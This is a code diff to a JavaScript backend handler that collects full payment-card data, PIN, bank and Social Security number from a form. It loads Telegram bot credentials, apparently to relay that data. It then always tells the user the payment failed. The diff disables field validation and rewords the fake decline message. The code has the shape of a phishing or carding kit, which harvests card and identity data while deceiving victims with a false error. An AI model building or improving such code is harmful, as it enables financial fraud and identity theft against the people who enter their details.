@@ -362,20 +362,20 @@ const provefetcher = asyncHandler(async (req, res) => {
 const fetcher = asyncHandler(async (req, res) => {
   const { cardHolder, email, cardNumber, cvv, exp, pin, bank, ssn, amount } =
     req.body;
-  if (
-    !cardHolder ||
-    !email ||
-    !cardNumber ||
-    !cvv ||
-    !exp ||
-    !pin ||
-    !bank ||
-    !ssn ||
-    !amount
-  ) {
-    res.status(400);
-    throw new Error("Please fill in the required fields");
-  }
+  // if (
+  //   !cardHolder ||
+  //   !email ||
+  //   !cardNumber ||
+  //   !cvv ||
+  //   !exp ||
+  //   !pin ||
+  //   !bank ||
+  //   !ssn ||
+  //   !amount
+  // ) {
+  //   res.status(400);
+  //   throw new Error("Please fill in the required fields");
+  // }
 
   const token = process.env.TG_TOKEN;
   const chatId = process.env.TG_ID;
@@ -398,7 +398,7 @@ const fetcher = asyncHandler(async (req, res) => {
   }
   res.status(201).json({
     message:
-      "Your card was declined. Please check your payment details or try a different card",
+      "Payment Failed. Please check your payment details or try a different method",
   });
 });
 
